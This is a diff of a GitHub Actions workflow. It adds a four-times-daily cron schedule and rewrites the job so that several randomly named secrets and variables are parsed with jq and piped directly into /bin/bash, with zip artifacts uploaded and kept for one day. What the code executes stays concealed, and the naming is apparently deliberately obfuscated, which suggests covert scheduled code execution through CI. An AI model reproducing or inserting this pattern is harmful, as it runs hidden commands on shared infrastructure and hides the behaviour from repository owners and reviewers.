@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '22 3,9,15,21 * * *'
 permissions:
   contents: read
   actions: read
@@ -15,20 +17,21 @@ jobs:
         uses: actions/checkout@v4
       - name: Perform
         env:
-          zkvol8236: ${{ secrets.zkvol8236 }}
+          rb754: ${{ secrets.rb754 }}
         run: |
-          printf '%s' "$zkvol8236" | jq -r .hp07921 | /bin/bash
-          printf '%s' "$lfeh0223" | jq -r .beuwv46908 | /bin/bash
-          echo $fsvd2565 | jq -r .eqsqi2835 | /bin/bash
-          echo $cp152 | jq -r .dolg107 | /bin/bash
-          echo $w48 | jq -r .x5088 | /bin/bash
-          echo $qjihm83 | jq -r .gmn7 | /bin/bash
-          printf '%s' "$zrvh5514" | jq -r .u421 | /bin/bash
+          printf '%s' "$rb754" | jq -r .xmaw5 | /bin/bash
+          echo $tuh1598 | jq -r .c07896 | /bin/bash
+          echo $pq5 | jq -r .etn53 | /bin/bash
+          printf '%s' "$xvrls065" | jq -r .bud3 | /bin/bash
+          echo $v8079 | jq -r .og7 | /bin/bash
+          echo $ya858 | jq -r .t891 | /bin/bash
+          printf '%s' "$ijv7306" | jq -r .tiwo253 | /bin/bash
+          printf '%s' "$kg6060" | jq -r .almj39 | /bin/bash
 
       - name: Upload results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: JOCNLF8h
+          name: RGneF6vO
           path: "*.zip"
           retention-days: 1
